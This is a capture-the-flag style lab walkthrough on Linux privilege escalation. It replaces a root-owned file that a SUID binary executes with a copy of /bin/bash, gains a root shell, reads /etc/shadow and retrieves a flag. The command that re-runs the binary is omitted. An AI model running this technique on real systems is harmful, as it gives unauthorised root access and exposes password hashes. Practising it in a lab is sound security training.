# Exploiting SUID Binaries

**SUID** = **Set Owner User ID**\
A special permission on a file that lets anyone run it with the file owner's privileges - usuall root.\
There's high possibility it's accessable if a file was with SUID owned by root.

### Practice

```bash
# Open target.ine.local:8000 on browser
# Check privilege
student@target:~$ whoami
student
student@target:~$ groups student
student : student

# List files
# s in welcome file = SUID
student@target:~$ ls -al
total 36
drwxr-xr-x 1 student student 4096 Sep 22  2018 .
drwxr-xr-x 1 root    root    4096 Sep 22  2018 ..
-rw-r--r-- 1 root    root      88 Sep 22  2018 .bashrc
-r-x------ 1 root    root    8296 Sep 22  2018 greetings
-rwsr-xr-x 1 root    root    8344 Sep 22  2018 welcome

# Try to execute greetings file
student@target:~$ ./greetings
bash: ./greetings: Permission denied
# welcome file
student@target:~$ ./welcome
Welcome to Attack Defense Labs
```

```bash
# welcome file information
student@target:~$ file welcome
welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped

# Investigate the binary
student@target:~$ strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid     <-  SUID
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
~~~~~~~~~~
```

```bash
# Remove greetings binary
student@target:~$ rm greetings
rm: remove write-protected regular file 'greetings'? y

# Locate /bin/bash as greetings
student@target:~$ cp /bin/bash greetings
student@target:~$ ls
greetings  welcome

# Run the welcome binary again
root@target:~# cat /etc/shadow
root:*:17764:0:99999:7:::
daemon:*:17764:0:99999:7:::
bin:*:17764:0:99999:7:::
sys:*:17764:0:99999:7:::
sync:*:17764:0:99999:7:::
games:*:17764:0:99999:7:::
man:*:17764:0:99999:7:::
lp:*:17764:0:99999:7:::
mail:*:17764:0:99999:7:::
news:*:17764:0:99999:7:::
uucp:*:17764:0:99999:7:::
proxy:*:17764:0:99999:7:::
www-data:*:17764:0:99999:7:::
backup:*:17764:0:99999:7:::
list:*:17764:0:99999:7:::
irc:*:17764:0:99999:7:::
gnats:*:17764:0:99999:7:::
nobody:*:17764:0:99999:7:::
_apt:*:17764:0:99999:7:::
student:!:17796::::::

# Privilege escalated
# Fing the flag
root@target:~# cd /root
root@target:/root# ls
flag
root@target:/root# cat flag
b92bcdc876d52108778e2d81f3b01494
```